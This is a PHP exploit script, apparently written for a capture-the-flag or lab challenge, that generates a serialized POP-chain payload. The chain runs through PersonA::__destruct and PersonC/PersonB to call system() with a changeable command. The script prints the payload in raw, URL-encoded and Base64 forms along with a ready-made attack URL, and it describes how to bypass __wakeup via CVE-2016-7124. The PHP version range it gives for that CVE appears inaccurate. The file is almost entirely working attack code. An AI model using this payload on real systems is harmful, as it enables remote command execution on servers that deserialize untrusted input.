<?php
/**
 * POP Chain Exploit Payload
 * 链路: PersonA::__destruct
 */

// === 类定义 (复制目标的类结构) ===
class Person {
    public $name;
    public $id;
    public $age;
}

class PersonA extends Person {
}

class PersonC extends Person {
}

class PersonB {
    private $name;
    private $id;
    private $age;
}

// === 构造利用链 ===

// PersonB 对象
$invokeObj_id = new PersonB();

// PersonC 对象
$inner = new PersonC();
$inner->name = "system";  // 危险函数名 (可改为 exec, passthru 等)
$inner->id = $invokeObj_id;  // PersonB 对象 (有 __invoke, 属性为私有)
$inner->age = new stdClass();  // 防止 __wakeup 报错

// 入口对象: PersonA
$exploit = new PersonA();
$exploit->name = $inner;  // PersonC 对象
$exploit->id = "check";  // 要调用的方法名
$exploit->age = "env";  // 命令参数 (可修改)

// === 生成 Payload ===
$payload = serialize($exploit);
echo "Payload (raw):\n" . $payload . "\n\n";
echo "Payload (URL encoded):\n" . urlencode($payload) . "\n\n";
echo "Payload (Base64):\n" . base64_encode($payload) . "\n\n";

// === 完整利用 URL ===
echo "利用URL:\n" . "http://target/index.php?person=" . urlencode($payload) . "\n\n";

// === 绕过 __wakeup (CVE-2016-7124, PHP < 7.4.26) ===
// 注意: 此绕过需要手动修改序列化字符串中的属性数量
// 将 O:X:"ClassName":N: 改为 O:X:"ClassName":(N+1):
// 例如: PersonB 的属性数量 +1
// 例如: PersonC 的属性数量 +1

